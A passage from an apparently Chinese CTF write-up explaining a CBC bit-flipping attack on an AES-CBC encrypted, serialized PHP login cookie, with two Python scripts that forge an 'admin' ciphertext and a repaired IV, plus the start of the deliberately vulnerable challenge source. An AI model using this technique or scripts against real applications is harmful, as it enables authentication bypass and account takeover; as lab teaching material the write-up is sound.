+<p>上面就是整个过程。这里把登录的用户名及其密码存入数组，序列化后进行AES-CBC模式的加密，其中iv，和密文以cookie储存，可以控制，导致存在攻击的可能。<br>使用skctf登陆，因为翻转目标是admin5位，所以登陆的用户名最好也为5位。登陆后存入数组序列化后变为： <code>a:2:&#123;s:8:&quot;username&quot;;s:5:&quot;skctf&quot;;s:8:&quot;password&quot;;s:5:&quot;skctf&quot;;&#125;</code><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/9113969-26714ee7ebb9ae3c.png" alt="图片.png"></p>
+<p>1.首先将明文修改为16字节的四组：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a<span class="punctuation">:</span><span class="number">2</span><span class="punctuation">:</span><span class="punctuation">&#123;</span>s<span class="punctuation">:</span><span class="number">8</span><span class="punctuation">:</span><span class="string">&quot;userna</span></span><br><span class="line"><span class="string">me&quot;</span>;s<span class="punctuation">:</span><span class="number">5</span><span class="punctuation">:</span><span class="string">&quot;skctf&quot;</span>;</span><br><span class="line">s<span class="punctuation">:</span><span class="number">8</span><span class="punctuation">:</span><span class="string">&quot;password&quot;</span>;s</span><br><span class="line"><span class="punctuation">:</span><span class="number">5</span><span class="punctuation">:</span><span class="string">&quot;skctf&quot;</span>;<span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>2.根据CBC攻击原理，只要修改第一组密文对应第二组’skctf’的位置的明文，就可以实现对第二组明文的改变。即第10-14位。（<strong>我们抓包获得的cipher是所有加密后的密文，因此只要我们更改cipher中第10-14位就可以。因为第二组明文和第一组密文已知，则可以求出第二组的中间值。将中间值中对应的第10-14位和明文中的skctf进行异或则可以得到应该修改的cipher的第10-14位的值。</strong>）<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/9113969-7fe2df1d21ce62a8.png" alt="图片.png"></p>
+<p>3.下面是网上找的重新生成密文的脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">cipher = <span class="string">&#x27;EvX06IpeOJ9iTJ7J1L9iP7ymKC1Phg7KySWJP0ZbAtlwVMnniIkdvRH60+BY5g+8i0WKbQvgJIZVbGsQGTzH5A==&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>)</span><br><span class="line">old = <span class="string">&quot;me\&quot;;s:5:\&quot;skctf\&quot;;&quot;</span></span><br><span class="line">new = <span class="string">&quot;me\&quot;;s:5:\&quot;admin\&quot;;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">16</span>):</span><br><span class="line">    cipher = cipher[:i] + <span class="built_in">chr</span>(<span class="built_in">ord</span>(cipher[i]) ^ <span class="built_in">ord</span>(old[i]) ^ <span class="built_in">ord</span>(new[i])) + cipher[i+<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> cipher.encode(<span class="string">&#x27;base64&#x27;</span>).strip()</span><br></pre></td></tr></table></figure>
+
+<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://upload-images.jianshu.io/upload_images/9113969-f295a006c62892a3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>用上面生成的密文修改cookie：cipher，访问，因为不能正常反序列化，所以报错返回一个cbc解密后的明文值。<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/9113969-6bc8562d5baf2a10.png" alt="图片.png"><br>4.根据CBC解密原理，修改第一块的密文可以达到修改第二块明文的结果，但同时也破坏了第一块明文。所以我们需要修复被破坏的第一块明文。根据上面得到的破坏后的明文，让他与原来的IV进行异或得到第一组的中间值，然后用这个中间值去跟修补后的明文异或从而得到一个新的IV，提交这个新的IV和cipher即可得到flag。<br>可以利用下面的脚本重新生成IV：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">plain = <span class="string">&#x27;uSb7VZM9bSikP7AiZD5F5m1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjQ6IjIzMzMiO30=&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>)</span><br><span class="line">iv = <span class="string">&#x27;KvfyPMU0MPU2PalcPn3TwA==&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">old = plain[:<span class="number">16</span>]</span><br><span class="line">new = <span class="string">&quot;a:2:&#123;s:8:\&quot;userna&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">16</span>):</span><br><span class="line">    iv = iv[:i] + <span class="built_in">chr</span>(<span class="built_in">ord</span>(iv[i]) ^ <span class="built_in">ord</span>(old[i]) ^ <span class="built_in">ord</span>(new[i])) + iv[i+<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> iv.encode(<span class="string">&#x27;base64&#x27;</span>).strip()</span><br></pre></td></tr></table></figure>
+
+<p>用生成的新IV替换cookie中的IV<br><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/9113969-b9994a76134aa880.png" alt="图片.png"></p>
+<h2 id="0x08-练习"><a href="#0x08-练习" class="headerlink" title="0x08 练习"></a>0x08 练习</h2><p>下面是上面练习当中的PHP源码及exp：</p>
+<p><strong>PHP code:</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;MY_AES_KEY&#x27;</span>, <span class="string">&quot;abcdef0123456789&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;MY_HMAC_KEY&#x27;</span>,<span class="string">&quot;1234567890123456&quot;</span> );</span><br><span class="line"><span class="comment">#define(&quot;FLAG&quot;,&quot;CENSORED&quot;);</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aes</span>(<span class="params"><span class="variable">$data</span>, <span class="variable">$encrypt</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$aes</span> = <span class="title function_ invoke__">mcrypt_module_open</span>(MCRYPT_RIJNDAEL_128, <span class="string">&#x27;&#x27;</span>, MCRYPT_MODE_CBC, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="variable">$iv</span> = <span class="title function_ invoke__">mcrypt_create_iv</span> (<span class="title function_ invoke__">mcrypt_enc_get_iv_size</span>(<span class="variable">$aes</span>), MCRYPT_RAND);</span><br><span class="line"><span class="variable">$iv</span> = <span class="string">&quot;1234567891234567&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">mcrypt_generic_init</span>(<span class="variable">$aes</span>, MY_AES_KEY, <span class="variable">$iv</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$encrypt</span> ? <span class="title function_ invoke__">mcrypt_generic</span>(<span class="variable">$aes</span>, <span class="variable">$data</span>) : <span class="title function_ invoke__">mdecrypt_generic</span>(<span class="variable">$aes</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span 